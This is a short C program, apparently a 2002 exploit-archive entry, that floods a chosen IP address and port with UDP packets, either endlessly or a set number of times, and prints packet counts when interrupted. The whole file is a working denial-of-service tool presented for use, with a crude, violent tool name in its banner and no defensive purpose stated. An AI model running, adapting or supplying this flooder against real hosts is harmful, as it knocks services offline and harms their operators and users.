#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#define shit "BLEAHD"

time_t elapsed;
long sendcount = 0, kbs;

void stats(int signum)
{
	kbs = (sendcount*6)/(time(0)-elapsed)/1024; // i dont think this is right but...
	printf("\npid: %d, ran for %u seconds\n",getpid(),(time(0) - elapsed));
	printf("%u packets out, total: %u Kb/s\n",sendcount,kbs);
	printf("aborting due to signal %d\n",signum);
	exit(32+signum);
}

void
usage(char *pname) {
 printf("raped.c by cys of NewNet\n");
 printf("Usage: %s dest[ip] x[0=flood] port[0=rand] delay(ms)[0=none]\n",pname);
 exit(-1);
}

int main(int argc, char **argv)
{
	struct sockaddr_in sin;
	int port, amount, i, s;
	elapsed = time(0);
	{int n;for (n=1;n<32;n++) signal(n,stats);}
	if(argc < 5)
		usage(argv[0]);
    
	if (atoi(argv[2]) != 0) { 
		amount = atoi(argv[2]); 
	} else { 
		amount = 0; 
	} 
 
	if(atoi(argv[3]) == 0)
	{
		srand((unsigned int)time(NULL));
		port = rand() % 65535;
	} else {
		if(atoi(argv[3]) < 1 || atoi(argv[3]) > 65535)
		{
			printf("Port must be over 1 and under 65535\n");
			exit(-1);
		} else {
			port = atoi(argv[3]);
		}
	}

	sin.sin_family=AF_INET;
	sin.sin_addr.s_addr=inet_addr(argv[1]);
	sin.sin_port=htons(port);
	s = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
	connect(s,(struct sockaddr *)&sin,sizeof(sin)); // connect in udp? il just leave it..
	printf("raped2.c by cys of NewNet\n");
	if(amount == 0) {
		printf("ip:%s x:0 port:%d delay:%d\n",argv[1],port,atoi(argv[4]));
		for(;;) {
			send(s,shit,50,0);
			sendcount++;
			if(atoi(argv[4])!=0) usleep(atoi(argv[4]));
		}
	} else {
		printf("ip:%s x:%d port:%d delay:%d\n",argv[1],amount,port,atoi(argv[4]));
		for(i=0;i<amount;i++){
			send(s,shit,50,0); 
			sendcount++;
			if(atoi(argv[4])!=0) usleep(atoi(argv[4]));
		}
	}
	printf("Exiting...\n");
}


// milw0rm.com [2002-09-10]